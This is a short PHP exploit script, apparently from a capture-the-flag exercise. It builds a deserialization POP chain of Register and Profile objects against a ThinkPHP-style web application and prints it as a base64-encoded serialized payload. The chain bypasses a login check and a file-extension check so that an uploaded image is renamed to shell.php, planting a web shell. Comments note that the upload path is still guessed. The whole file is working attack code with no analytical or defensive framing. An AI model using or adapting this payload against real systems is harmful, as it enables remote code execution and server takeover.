<?php
namespace app\web\controller;

class Register {
    public $checker;
    public $registed;
}

class Profile {
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except;
}

// 构造 POP 链
$profile = new Profile();
$profile->checker = 0;  // 绕过登录检查
$profile->ext = 1;  // 绕过ext检查
$profile->except = ['index' => 'upload_img'];  // __call时调用upload_img

// 关键：filename_tmp 需要是一个有效的图片文件路径
// 我们需要先上传一个图片，然后获取其路径
// 上传后的路径是: /var/www/html/public/upload/{md5(ip)}/{md5(filename)}.png

// 但我们不知道服务器IP，所以需要猜测或利用其他方式
// 让我先尝试上传一个图片，看看路径

// 假设我们已经上传了一个图片
// filename_tmp = 已上传图片的路径
// filename = shell.php

// 暂时设置这些值
$profile->filename_tmp = "/var/www/html/public/upload/test/shell.png";
$profile->filename = "shell.php";
$profile->upload_menu = "test";

$register = new Register();
$register->registed = 0;  // 触发__destruct
$register->checker = $profile;  // 调用$profile->index()

// 序列化并base64编码
$payload = base64_encode(serialize($register));
echo $payload . "\n";
